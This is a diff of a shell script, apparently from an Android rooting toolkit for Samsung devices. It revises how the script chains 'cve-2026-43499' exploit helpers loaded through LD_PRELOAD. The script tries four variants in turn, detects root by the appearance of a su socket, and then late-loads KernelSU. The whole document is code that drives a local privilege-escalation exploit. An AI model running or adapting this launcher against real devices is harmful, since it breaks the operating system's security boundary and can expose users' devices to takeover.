@@ -20,7 +20,8 @@ else
              "$TMP_PATH/libcve43499root.so" \
              "$TMP_PATH/ksud-s25u-kdp" 2>/dev/null || true
 
-    # Function to sequentially test exploit helper and library pairs
+    ACTIVE_HELPER=""
+
     run_exploit_attempt() {
         local helper="$1"
         local so="$2"
@@ -28,28 +29,37 @@ else
         [ -f "$TMP_PATH/$so" ] || return 1
 
         echo "[*] Trying variant: $helper + $so" >> "$LOGFILE"
+        rm -f "$TMP_PATH/temp_su.sock"
+
         CVE43499_ROOT_HELPER="$TMP_PATH/$helper" \
         LD_PRELOAD="$TMP_PATH/$so" \
         /system/bin/true >> "$LOGFILE" 2>&1
-        sleep 2
+        local ret=$?
+
+        # Check for socket establishment
+        for i in 1 2 3; do
+            if [ -e "$TMP_PATH/temp_su.sock" ]; then
+                echo "[+] Variant succeeded: socket established." >> "$LOGFILE"
+                ACTIVE_HELPER="$helper"
+                return 0
+            fi
+            sleep 1
+        done
+
+        echo "[-] Variant failed (exit: $ret), socket not found." >> "$LOGFILE"
+        return 1
     }
 
-    # Attempt 1: cve-2026-43499-root + -app.so (primary for Termux app context)
-    run_exploit_attempt "cve-2026-43499-root" "cve-2026-43499-app.so"
-
-    # Attempt 2: cve-2026-43499-root + cve-2026-43499.so
-    if ! su -c "id" 2>/dev/null | grep -q "uid=0"; then
-        run_exploit_attempt "cve-2026-43499-root" "cve-2026-43499.so"
-    fi
-
-    # Attempt 3: fallback libcve43499root.so + -app.so
-    if ! su -c "id" 2>/dev/null | grep -q "uid=0"; then
-        run_exploit_attempt "libcve43499root.so" "cve-2026-43499-app.so"
-    fi
-
-    # Attempt 4: fallback libcve43499root.so + cve-2026-43499.so
-    if ! su -c "id" 2>/dev/null | grep -q "uid=0"; then
-        run_exploit_attempt "libcve43499root.so" "cve-2026-43499.so"
+    # Sequentially test variants until one creates the socket
+    if ! run_exploit_attempt "cve-2026-43499-root" "cve-2026-43499-app.so"; then
+        if ! run_exploit_attempt "cve-2026-43499-root" "cve-2026-43499.so"; then
+            if ! run_exploit_attempt "libcve43499root.so" "cve-2026-43499-app.so"; then
+                if ! run_exploit_attempt "libcve43499root.so" "cve-2026-43499.so"; then
+                    echo "[-] All exploit variants failed. Reboot recommended." >> "$LOGFILE"
+                    exit 1
+                fi
+            fi
+        fi
     fi
 
     # KernelSU stage & late-load
@@ -62,11 +72,7 @@ else
     fi
     chmod 755 "$TMP_PATH/.ksud-stage" "$TMP_PATH/ksud-s25u-kdp" "$TMP_PATH/ksud-next-a54x-A546EXXSKFZF4-kdp" 2>/dev/null || true
 
-    if [ -x "$TMP_PATH/cve-2026-43499-root" ]; then
-        "$TMP_PATH/cve-2026-43499-root" --late-load >> "$LOGFILE" 2>&1
-    elif [ -x "$TMP_PATH/libcve43499root.so" ]; then
-        "$TMP_PATH/libcve43499root.so" --late-load >> "$LOGFILE" 2>&1
-    fi
+    "$TMP_PATH/$ACTIVE_HELPER" --late-load >> "$LOGFILE" 2>&1
     sleep 2
 fi
 
